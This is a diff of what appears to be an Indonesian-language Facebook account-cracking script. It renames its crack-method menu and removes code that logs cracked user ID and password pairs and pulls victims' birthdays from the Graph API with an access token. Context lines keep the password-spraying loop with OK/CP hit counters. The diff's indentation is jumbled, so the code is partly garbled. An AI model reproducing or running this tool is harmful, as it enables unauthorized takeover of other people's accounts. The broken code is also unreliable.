@@ -53,8 +53,6 @@ _M_ = "\x1b[0;91m" # Merah
 _H_ = "\x1b[0;92m" # Hijau
 _U_ = "\x1b[0;91m" # Ungu
 
-balmond = s+">"+m+"><"+s+"<"
-
 ### Logo
 _logo_line_1_ = ('%s ___  __  __ ___ ___ '%(_P_))
 _logo_line_2_ = ('%s|   \|  \/  | _ ) __| %s┌─────────────────────────┐'%(_P_,_U_))
@@ -519,7 +517,7 @@ class _crack_dev_:
         else:
             for _suci_salsabila_ in self._files_crack_:
                 _suci_salsabila_.update({"pw":self.pw})
-            mode_crack()
+            start_method()
             put = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
             _dapunta_cici_(''%())
             if put in ['']:
@@ -574,18 +572,6 @@ class _crack_dev_:
             _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self._hitung_loop_,len(self._files_crack_),_U_,_P_,len(self._ok_dapunta_),_U_,_P_,len(self._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
         except:
             self.api(_files_crack_)
-    def opsi():
-	ops = input(balmond+l+" Munculkan Opsi "+h+"{"+k+"y/t"+h+"}"+l+" : ")
-	if ops=="y" or ops=="Y":
-		opsit.append("munculkan")
-	elif ops=="t" or ops=="T":
-		opsit.append("jangan")
-	else:
-		jalan(balmond+m+" Pilih Ya Atau Tidak")
-		time.sleep(0.5)
-		opsi()
-	mode_crack()
-
     def mbasic(self,_files_crack_):
         try:
             for _suci_salsabila_ in _files_crack_.get("pw"):
@@ -618,22 +604,6 @@ class _crack_dev_:
                 else:continue
             self._hitung_loop_+=1
             _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self._hitung_loop_,len(self._files_crack_),_U_,_P_,len(self._ok_dapunta_),_U_,_P_,len(self._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
-              bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
-							cp.append(uid+"•"+pw)
-				elif "munculkan" in opsit:
-					try:
-						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+_tok_dev_)
-						mantap = json.loads(ttl.text)
-						bacot = mantap["birthday"]
-						lahir = bacot.split("/")
-						ceker_ttl(uid,pw,ua,lahir,tahunnya)
-					except (KeyError,IOError):
-						ceker(uid,pw,ua,tahunnya)
-				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31) 
         except:
             self.mbasic(_files_crack_)
 
@@ -808,7 +778,7 @@ def _var_ugen_(_Dapunta_Cinta_Cici_):
     _dapunta_cici_("%s[%s0%s] %sKembali"%(_U_,_P_,_U_,_P_))
 
 ### Tampilan Metode
-def mode_crack():
+def start_method():
     _dapunta_cici_('\n%s[%s1%s] %sMetode Api'%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('%s[%s2%s] %sMetode Mbasic'%(_U_,_P_,_U_,_P_))
 
